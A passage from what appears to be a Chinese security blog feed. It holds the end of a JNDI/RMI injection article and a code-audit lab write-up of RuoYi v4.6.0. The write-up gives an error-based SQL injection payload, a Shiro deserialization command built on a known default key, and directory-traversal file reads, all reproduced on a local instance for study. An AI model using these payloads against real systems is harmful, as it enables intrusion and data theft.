class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>reference 指定了一个 Calculator 类，于远程的 <code>http://127.0.0.1:8081/</code> 服务端上，等待客户端的调用并实例化执行。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306174535684.png" data-caption="image-20230306174535684"><img src="/../images/Java/jndi/image-20230306174535684.png" alt="image-20230306174535684"></a></p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>经过上面的分析，归纳总结为由于 <code>lookup()</code> 的参数可控，攻击者在远程服务器上构造恶意的 <code>Reference</code> 类绑定在 <code>RMIServer</code> 的 <code>Registry</code> 里面，然后客户端调用 <code>lookup()</code> 函数里面的对象，远程类获取到 <code>Reference</code> 对象，客户端接收 <code>Reference</code> 对象后，寻找 <code>Reference</code> 中指定的类，若查找不到，则会在 <code>Reference</code> 中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行，从而达到 <code>JNDI</code> 注入攻击。</p><h2 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.javasec.org/javase/JNDI/</span><br><span class="line">https://docs.oracle.com/javase/tutorial/jndi/overview/</span><br><span class="line">https://xz.aliyun.com/t/6633</span><br><span class="line">https://www.cnblogs.com/nice0e3/p/13958047.html</span><br><span class="line">https://blog.csdn.net/qq_38626043/article/details/129256939</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
            <tag> RMI </tag>
            
            <tag> LDAP </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(六)-若依管理系统V4.6.0</title>
      <link href="/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/"/>
      <url>/2023/03/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AD)-%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV4-6-0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>若依管理系统是基于 SpringBoot 开发的轻量级 JAVA 开发框架，，本篇文章基于 V4.6.0 版本的基础上对部分历史漏洞进行审计分析。项目地址：<a href="https://gitee.com/y_project/RuoYi/tree/v4.6.0">https://gitee.com/y_project/RuoYi/tree/v4.6.0</a></p><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>这里依然使用 Phpstudy 作为数据库源，利用 navicat 导入数据表</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193032129.png" data-caption="image-20221128193032129"><img src="/../images/Java/ruoyi/image-20221128193032129.png" alt="image-20221128193032129"></a></p><p>创建数据库</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193140018.png" data-caption="image-20221128193140018"><img src="/../images/Java/ruoyi/image-20221128193140018.png" alt="image-20221128193140018"></a></p><p>导入数据表</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193247668.png" data-caption="image-20221128193247668"><img src="/../images/Java/ruoyi/image-20221128193247668.png" alt="image-20221128193247668"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128193314048.png" data-caption="image-20221128193314048"><img src="/../images/Java/ruoyi/image-20221128193314048.png" alt="image-20221128193314048"></a></p><p>IDEA导入项目源码，注意源码路径不要有中文，等待 Maven 下载项目依赖</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128194601780.png" data-caption="image-20221128194601780"><img src="/../images/Java/ruoyi/image-20221128194601780.png" alt="image-20221128194601780"></a></p><p>我这边修改了几处，一为数据库账号密码及数据库名称（<strong>注意：修改为自己的本地数据库账号密码</strong>），二是将项目端口 80 改为 8888 ，路径改为了本机能访问的路径，因为本人环境是虚拟机，没有设置D盘</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202414458.png" data-caption="image-20221128202414458"><img src="/../images/Java/ruoyi/image-20221128202414458.png" alt="image-20221128202414458"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128201751385.png" data-caption="image-20221128201751385"><img src="/../images/Java/ruoyi/image-20221128201751385.png" alt="image-20221128201751385"></a></p><p>修改如下</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202005935.png" data-caption="image-20221128202005935"><img src="/../images/Java/ruoyi/image-20221128202005935.png" alt="image-20221128202005935"></a></p><p>点击运行项目，访问 <a href="http://localhost:8888/login">http://localhost:8888/login</a> 成功搭建，默认账号为 <code>admin/admin123</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202131048.png" data-caption="image-20221128202131048"><img src="/../images/Java/ruoyi/image-20221128202131048.png" alt="image-20221128202131048"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128202451155.png" data-caption="image-20221128202451155"><img src="/../images/Java/ruoyi/image-20221128202451155.png" alt="image-20221128202451155"></a></p><h2 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h2><h3 id="1、pom-xml-审计"><a href="#1、pom-xml-审计" class="headerlink" title="1、pom.xml 审计"></a>1、pom.xml 审计</h3><p>老套路，存在 pom.xml，先审计其使用了哪些框架，框架组件是否存在历史漏洞。这个与以往的项目不一样的是，系统存在多个 pom.xml，我们只需要审计最外层的 pom.xml 即可</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221128212237103.png" data-caption="image-20221128212237103"><img src="/../images/Java/ruoyi/image-20221128212237103.png" alt="image-20221128212237103"></a></p><p>第三方组件如下，这一篇笔者不打算展开组件漏洞的审计，可自行根据版本网上 search 复现</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">| 组件名称           | 组件版本 |</span><br><span class="line">| ------------------ | -------- |</span><br><span class="line">| shiro              | 1.7.0    |</span><br><span class="line">| thymeleaf          | 2.0.0    |</span><br><span class="line">| druid              | 1.2.2    |</span><br><span class="line">| bitwalker          | 1.21     |</span><br><span class="line">| kaptcha            | 2.3.2    |</span><br><span class="line">| swagger            | 2.9.2    |</span><br><span class="line">| pagehelper         | 1.3.0    |</span><br><span class="line">| fastjson           | 1.2.74   |</span><br><span class="line">| oshi               | 5.3.6    |</span><br><span class="line">| jna                | 5.6.0    |</span><br><span class="line">| commons.io         | 2.5      |</span><br><span class="line">| commons.fileupload | 1.3.3    |</span><br><span class="line">| poi                | 4.1.2    |</span><br><span class="line">| velocity           | 1.7      |</span><br></pre></td></tr></table></figure></div><br/><h3 id="2、漏洞审计"><a href="#2、漏洞审计" class="headerlink" title="2、漏洞审计"></a>2、漏洞审计</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>SpringBoot中 使用了 Mybatis 的 SQL 注入一般都是因为使用了 $ ，所以全局搜索 .xml 的 <code>$&#123;</code>。（注：搜索.xml文件的原因是该系统使用了 Mybatis 中的<code>配置文件开发-》编写 xml 配置文件来映射相应的代码</code>）</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129125159545.png" data-caption="image-20221129125159545"><img src="/../images/Java/ruoyi/image-20221129125159545.png" alt="image-20221129125159545"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129125130419.png" data-caption="image-20221129125130419"><img src="/../images/Java/ruoyi/image-20221129125130419.png" alt="image-20221129125130419"></a></p><p>这边先对第一个可疑点进行审计 <code>$&#123;params.dataScope&#125;</code></p><p>因为该项目使用了 <code>mybatis</code> 并且利用了配置文件开发，所以会在 <code>resource</code> 目录下出现映射的 <code>.xml</code> 配置文件。我们在 <code>SysRoleMapper.xml</code> 文件中找到了可疑参数 <code>$&#123;params.dataScope&#125;</code>，并定位到映射语句 <code>id=selectRolelist</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129131526187.png" data-caption="image-20221129131526187"><img src="/../images/Java/ruoyi/image-20221129131526187.png" alt="image-20221129131526187"></a></p><p>通过上面我们定位到文件 <code>resources</code> 目录下的 <code>SysRoleMapper.xml</code> 配置文件中的映射语句 <code>id=selectRolelist</code>，根据以往文章的学习已知 <code>resources</code> 层对应 <code>dao</code> 层的接口，文件名也一致，所以我们定位到 <code>dao</code> 层的 <code>SysRoleMapper.java</code> ，找到 <code>selectRolelist</code> 接口</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129132412165.png" data-caption="image-20221129132412165"><img src="/../images/Java/ruoyi/image-20221129132412165.png" alt="image-20221129132412165"></a></p><p>然后 <code>Ctrl + 鼠标左键</code> 跟进 <code>selectRolelist</code> 接口，看是谁调用这个接口。我们来到了 <code>service</code> 层的实体类 <code>SysRoleServiceImpl.java</code> 文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129132823022.png" data-caption="image-20221129132823022"><img src="/../images/Java/ruoyi/image-20221129132823022.png" alt="image-20221129132823022"></a></p><p>然后我们将光标放到 <code>selectRoleList</code> 方法处，快捷键 <code>Ctrl + u</code> 进入该方法父类&#x2F;接口定义的位置 Service 层的接口 <code>ISysRoleService.java</code> <strong>（这里也可以直接鼠标右键方法名找到其调用链直接定位到 controller 层接口）</strong></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129133452563.png" data-caption="image-20221129133452563"><img src="/../images/Java/ruoyi/image-20221129133452563.png" alt="image-20221129133452563"></a></p><p>最后 <code>Ctrl + 鼠标左键</code> ，定位到具体的实现代码,由下图可知，59行、69行均有调用该函数</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129133753389.png" data-caption="image-20221129133753389"><img src="/../images/Java/ruoyi/image-20221129133753389.png" alt="image-20221129133753389"></a></p><p>通过代码定位到 <code>Controller</code> 层的 <code>SysRoleController.java</code> 第59行 ,这个就是我们最终需要审计的代码，&#x2F;list 有两个参数，SysRole 和 role ，最终 return 为 list ，而 <code>List&lt;SysRole&gt; list = roleService.selectRoleList(role);</code>,所以参数值为 <code>SysRole</code> 参数定义的实体类</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129142906434.png" data-caption="image-20221129142906434"><img src="/../images/Java/ruoyi/image-20221129142906434.png" alt="image-20221129142906434"></a></p><p><code>Ctrl + 鼠标左键</code> 跟进 <code>SysRole</code> 参数，具体实体类如下，具体参数值为：<code>roleId=&amp;roleName=&amp;roleKey=&amp;roleSort=&amp;dataScope=&amp;status=&amp;delFlag=&amp;flag=&amp;menuIds=&amp;deptIds=</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129135057213.png" data-caption="image-20221129135057213"><img src="/../images/Java/ruoyi/image-20221129135057213.png" alt="image-20221129135057213"></a></p><p><code>dataScope</code> 参数没有过滤直接返回</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129144458616.png" data-caption="image-20221129144458616"><img src="/../images/Java/ruoyi/image-20221129144458616.png" alt="image-20221129144458616"></a>    </p><p>尝试漏洞复现，定位路由从上到下 <code>/system/role/list</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129142133925.png" data-caption="image-20221129142133925"><img src="/../images/Java/ruoyi/image-20221129142133925.png" alt="image-20221129142133925"></a></p><p>且通过注解可知道 &#x2F;list 为 POST 请求方式</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129141948518.png" data-caption="image-20221129141948518"><img src="/../images/Java/ruoyi/image-20221129141948518.png" alt="image-20221129141948518"></a></p><p>直接后台浏览，找到 <code>/system/role/list</code> 路径</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129150602128.png" data-caption="image-20221129150602128"><img src="/../images/Java/ruoyi/image-20221129150602128.png" alt="image-20221129150602128"></a></p><p>我们看到这里是没有 <code>dataScope</code> 参数的，我们自己加上即可</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129181626999.png" data-caption="image-20221129181626999"><img src="/../images/Java/ruoyi/image-20221129181626999.png" alt="image-20221129181626999"></a></p><p>漏洞 payload: <code>pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523</code></p><p>添加参数后，随便输入字符返回报错</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182031431.png" data-caption="image-20221129182031431"><img src="/../images/Java/ruoyi/image-20221129182031431.png" alt="image-20221129182031431"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129181939916.png" data-caption="image-20221129181939916"><img src="/../images/Java/ruoyi/image-20221129181939916.png" alt="image-20221129181939916"></a></p><p>成功查询版本信息，证明存在SQL注入</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182436018.png" data-caption="image-20221129182436018"><img src="/../images/Java/ruoyi/image-20221129182436018.png" alt="image-20221129182436018"></a></p><p>可直接发包到 sqlmap 跑数据 </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129182906151.png" data-caption="image-20221129182906151"><img src="/../images/Java/ruoyi/image-20221129182906151.png" alt="image-20221129182906151"></a></p><p>至此，<code>selectRolelist</code> 接口的SQL注入审计就结束了，整个审计流程为 <code>SysRoleMapper.xml -》SysRoleMapper.jave -》SysRoleServiceImpI.java -》ISysRoleService.java -》SysRoleController.java -》SysRole.java</code></p><p>简单概况就是 ${ 定位漏洞点 -》resource 目录下的 Mybatis 映射语句配置文件 -》通过映射语句定位 Service 层的实体类接口 -》再定位到 Service 层的接口文件 -》通过接口定位到 Controller 层最终调用接口 -》最后定位到接口的具体实现代码 -》分析参数是否有过滤</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230220220920253.png" data-caption="image-20230220220920253"><img src="/../images/Java/ruoyi/image-20230220220920253.png" alt="image-20230220220920253"></a></p><p>我们亦可以通过对比官方更新文件找到漏洞点进行审计</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216125250617.png" data-caption="image-20230216125250617"><img src="/../images/Java/ruoyi/image-20230216125250617.png" alt="image-20230216125250617"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216125414063.png" data-caption="image-20230216125414063"><img src="/../images/Java/ruoyi/image-20230216125414063.png" alt="image-20230216125414063"></a></p><p>修改前</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216130127701.png" data-caption="image-20230216130127701"><img src="/../images/Java/ruoyi/image-20230216130127701.png" alt="image-20230216130127701"></a></p><p>修改后</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230216130102638.png" data-caption="image-20230216130102638"><img src="/../images/Java/ruoyi/image-20230216130102638.png" alt="image-20230216130102638"></a></p><br/><h4 id="Shiro组件漏洞"><a href="#Shiro组件漏洞" class="headerlink" title="Shiro组件漏洞"></a>Shiro组件漏洞</h4><p>若依系统使用了 Shiro ，我们知道 Shiro &lt; 1.2.4 存在反序列化漏洞， Shiro 1.4.2 到 1.8.0 存在权限绕过漏洞，本项目使用的 Shiro 版本为 1.7.0。</p><p><strong>1）Shiro 反序列化</strong></p><p>这里通过 Burp 插件找到了 Shiro 默认密钥 <code>zSyK5Kp6PZAAjlT+eeNMlg==</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200200219.png" data-caption="image-20221129200200219"><img src="/../images/Java/ruoyi/image-20221129200200219.png" alt="image-20221129200200219"></a></p><p>这边使用 <a href="https://github.com/Ares-X/shiro-exploit">Github</a> 上工具进行了复现，第一次尝试并没成功，后面换了一个工具，发现又可以了，所以平常在实战中遇到 Shiro Key 泄露的情况，多换几个工具尝试一下，没准会有收获</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200510839.png" data-caption="image-20221129200510839"><img src="/../images/Java/ruoyi/image-20221129200510839.png" alt="image-20221129200510839"></a></p><p>进行命令执行 <code>python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http://192.168.114.160:8888/ -v 2 -k zSyK5Kp6PZAAjlT+eeNMlg== -c whoami</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200614230.png" data-caption="image-20221129200614230"><img src="/../images/Java/ruoyi/image-20221129200614230.png" alt="image-20221129200614230"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129200636926.png" data-caption="image-20221129200636926"><img src="/../images/Java/ruoyi/image-20221129200636926.png" alt="image-20221129200636926"></a></p><p><strong>漏洞审计：</strong></p><p>Shiro AES 秘钥在 1.2.4 版本及之前版本是存在密钥硬编码的，1.2.5 版本以后 Shiro 提供了 AES 密钥的随机生成代码，但如果仅进行 Shiro 版本升级，AES 密钥仍硬编码在代码中，仍然会存在反序列化风险。在审计中我们可以全局搜索 <code>setCipherKey</code> ,该方法是用于修改密钥的，若存在 <code>setCipherKey</code> 方法则说明存在默认key，进一步搜索 <code>cipherKey</code> 可查看具体密钥值</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129210227296.png" data-caption="image-20221129210227296"><img src="/../images/Java/ruoyi/image-20221129210227296.png" alt="image-20221129210227296"></a></p><p>密钥硬编码在 <code>application.yml</code> 文件处</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129210304172.png" data-caption="image-20221129210304172"><img src="/../images/Java/ruoyi/image-20221129210304172.png" alt="image-20221129210304172"></a></p><p><strong>2）Shiro 权限绕过审计</strong></p><p>此漏洞也只需要审计 <code>ShiroConfig.java</code> 配置文件里面的过滤器有没有对目录进行限制。由上一篇系列文章我们知道 <code>anon</code> 为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口；<code>authc</code> 为登录拦截器，需要登录认证才能访问的资源，需要在配置文件配置需要登录的 URL 路径</p><p>authc 拦截器匹配规则如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 通配符 | 说明                    |</span><br><span class="line">| ------ | ----------------------- |</span><br><span class="line">| ？     | 匹配任意一个字符        |</span><br><span class="line">| *      | 匹配任意字符，包括0个   |</span><br><span class="line">| **     | 匹配任意层路径，包括0个 |</span><br></pre></td></tr></table></figure></div><p>以下静态资源进行匿名登录，不需要认证即可访问</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129212610780.png" data-caption="image-20221129212610780"><img src="/../images/Java/ruoyi/image-20221129212610780.png" alt="image-20221129212610780"></a></p><p>对需要认证的页面进行了 <code>/**</code> 限制，需要登录认证才能访问</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221129212641545.png" data-caption="image-20221129212641545"><img src="/../images/Java/ruoyi/image-20221129212641545.png" alt="image-20221129212641545"></a></p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>若依系统任意读取文件影响版本为 <code>RuoYi &lt; v4.5.1</code> ，本环境为 <code>4.6.0</code>，这边重新部署了<a href="https://gitee.com/y_project/RuoYi/repository/archive/v4.5.0.zip">v4.5.0</a> 的环境，学习该漏洞，部署方法如上。</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20221130134353409.png" data-caption="image-20221130134353409"><img src="/../images/Java/ruoyi/image-20221130134353409.png" alt="image-20221130134353409"></a></p><p>通过对比 V4.5.0 与 V4.5.1 的代码分析定位漏洞点</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215406546.png" data-caption="image-20230206215406546"><img src="/../images/Java/ruoyi/image-20230206215406546.png" alt="image-20230206215406546"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215514857.png" data-caption="image-20230206215514857"><img src="/../images/Java/ruoyi/image-20230206215514857.png" alt="image-20230206215514857"></a></p><p>V4.5.0 漏洞未修复前源码</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215622205.png" data-caption="image-20230206215622205"><img src="/../images/Java/ruoyi/image-20230206215622205.png" alt="image-20230206215622205"></a></p><p>V4.5.1漏洞修复后更新后的代码</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230206215726171.png" data-caption="image-20230206215726171"><img src="/../images/Java/ruoyi/image-20230206215726171.png" alt="image-20230206215726171"></a></p><p>根据官方代码可知漏洞位置为</p><p> <code>ruoyi-admin/src/main/java/com/ruoyi/web/controller/common/CommonController.java</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207211853841.png" data-caption="image-20230207211853841"><img src="/../images/Java/ruoyi/image-20230207211853841.png" alt="image-20230207211853841"></a></p><p>由代码可知，在下载资源时没有任何的过滤，可直接下载本地资源</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地资源通用下载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/common/download/resource&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resourceDownload</span><span class="params">(String resource, HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 本地资源路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">localPath</span> <span class="operator">=</span> Global.getProfile();</span><br><span class="line">    <span class="comment">// 数据库资源地址</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadPath</span> <span class="operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</span><br><span class="line">    <span class="comment">// 下载名称</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">downloadName</span> <span class="operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);</span><br><span class="line">    FileUtils.setAttachmentResponseHeader(response, downloadName);</span><br><span class="line"></span><br><span class="line">    FileUtils.writeBytes(downloadPath, response.getOutputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>审计初步请求路径为 <code>/common/download/resource?resource=</code>，使用的方法为 GET（因为使用的注解是 @GetMapping）</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214447968.png" data-caption="image-20230207214447968"><img src="/../images/Java/ruoyi/image-20230207214447968.png" alt="image-20230207214447968"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207221539853.png" data-caption="image-20230207221539853"><img src="/../images/Java/ruoyi/image-20230207221539853.png" alt="image-20230207221539853"></a></p><p>本地资源路径为开始时我们设置的 <code>uploadPath</code> 路径，这段代码下载的文件就是这个路径下的文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214512267.png" data-caption="image-20230207214512267"><img src="/../images/Java/ruoyi/image-20230207214512267.png" alt="image-20230207214512267"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214258149.png" data-caption="image-20230207214258149"><img src="/../images/Java/ruoyi/image-20230207214258149.png" alt="image-20230207214258149"></a></p><p>分析代码 <code>String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</code>，其中 <code>localPath</code> 为本地资源路径 + <code>StringUtils.substringAfter()</code> 方法，其中方法中定义了请求参数为 <code>resource</code>  和请求前缀 <code>Constants.RESOURCE_PREFIX</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207214603424.png" data-caption="image-20230207214603424"><img src="/../images/Java/ruoyi/image-20230207214603424.png" alt="image-20230207214603424"></a></p><p>我们跟进 <code>Constants.RESOURCE_PREFIX</code>  <code> Ctrl + 鼠标左键</code>  查看文件下载资源时的请求前缀是什么，由下图可知，请求下载前的资源前缀为 <code>/profile</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207215525136.png" data-caption="image-20230207215525136"><img src="/../images/Java/ruoyi/image-20230207215525136.png" alt="image-20230207215525136"></a></p><p><code>downloadName = StringUtils.substringAfterLast(downloadPath, &quot;/&quot;);</code> 即下载名称为先执行 <code>downloadPath</code> 方法，再用 <code>separator&quot;/&quot;</code>(分隔符+下载文件的名称)</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207220732139.png" data-caption="image-20230207220732139"><img src="/../images/Java/ruoyi/image-20230207220732139.png" alt="image-20230207220732139"></a></p><p>整合上面分析的，得到整体路由为：<code>/common/download/resource?resource=/profile/下载文件的名称</code>,使用方法为GET</p><p>漏洞复现</p><p>1、我们现在 <code>localPath</code> 即 <code>C:/Tools/enviroment/RuoYi-v4.5.0/ruoyi/uploadPath</code> 目录下创建一个文件用于测试</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207221912564.png" data-caption="image-20230207221912564"><img src="/../images/Java/ruoyi/image-20230207221912564.png" alt="image-20230207221912564"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222514373.png" data-caption="image-20230207222514373"><img src="/../images/Java/ruoyi/image-20230207222514373.png" alt="image-20230207222514373"></a></p><p>2、构造请求连接为 <code>/common/download/resource?resource=/profile/flag.txt</code>，需在后台访问</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222626156.png" data-caption="image-20230207222626156"><img src="/../images/Java/ruoyi/image-20230207222626156.png" alt="image-20230207222626156"></a></p><p>3、由于代码没有对下载的路径进行限制，我们尝试利用目录穿越任意下载系统文件 <code>windows/win.ini</code>，由下图可知，我们到达 C盘下的 <code>windows/win.ini</code> 有六层，所以我们需要六个 ..&#x2F; 进行目录穿越</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207222906262.png" data-caption="image-20230207222906262"><img src="/../images/Java/ruoyi/image-20230207222906262.png" alt="image-20230207222906262"></a></p><p>成功利用目录穿越漏洞实现任意文件下载</p><p><a data-fancybox="gallery" data-src="/../images/Java/ruoyi/image-20230207223141156.png" data-caption="image-20230207223141156"><img src="/../images/Java/ruoyi/image-20230207223141156.png" alt="image-20230207223141156"></a></p><h2 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_44029310/article/details/125296406</span><br><span 